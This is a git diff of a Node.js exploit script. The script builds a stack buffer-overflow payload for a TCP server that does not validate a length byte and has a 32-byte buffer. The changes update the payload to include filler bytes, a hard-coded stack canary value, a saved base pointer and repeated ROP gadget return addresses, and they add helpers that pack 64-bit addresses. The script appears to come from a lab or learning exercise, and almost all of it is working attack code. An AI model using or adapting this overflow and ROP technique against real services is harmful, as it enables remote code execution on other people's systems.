@@ -10,21 +10,22 @@ const net = require("net");
   +----+----+----+-- ... --+
   
   ps = payload size
-  
-  Unfortunately, the server doesn't check invalid ps inputs.
-  Besides the payload buffer on the server side can only hold
-  up to 32 bytes. This is why we can apply a buffer overflow 
-  attack.
+
+  The server doesn't validate incoming ps values. Besides, the 
+  buffer which stores the message payload can only hold up to 
+  32 bytes.
 
 */
 
 const evilPayload = merge(
-  string("A".repeat(32)), // buffer
-  string("B".repeat(12 + 4)), // stack alignment and socketfd parameter
-  string("C".repeat(8)), // stack base pointer
-  addr64("0x100000cf1"), // return address
-  string("D".repeat(8)),
-  addr64("0x100000cf1")
+  string("A".repeat(32)), // fill the buffer
+  string("B".repeat(8)), // stack alignment
+  hexLE("0xea8cf540df1f0038"), // stack canary
+  //string("C".repeat(12 + 4)), // stack alignment and socketfd parameter
+  string("D".repeat(8)), // stack base pointer
+  hexLE("0x103572c61"), // ROP gadget #1
+  string("D".repeat(8)), // stack base pointer
+  hexLE("0x103572c61"), // ROP gadget #1
 );
 
 const evilMessage = merge(byte(evilPayload.length), evilPayload);
@@ -52,8 +53,14 @@ function byte(b) {
   return buffer;
 }
 
-function addr64(string) {
+function hexLE(string) {
   const buffer = Buffer.alloc(8);
   buffer.writeBigUInt64LE(BigInt(string), 0);
+  return buffer;
+}
+
+function hexBE(string) {
+  const buffer = Buffer.alloc(8);
+  buffer.writeBigUInt64BE(BigInt(string), 0);
   return buffer;
 }
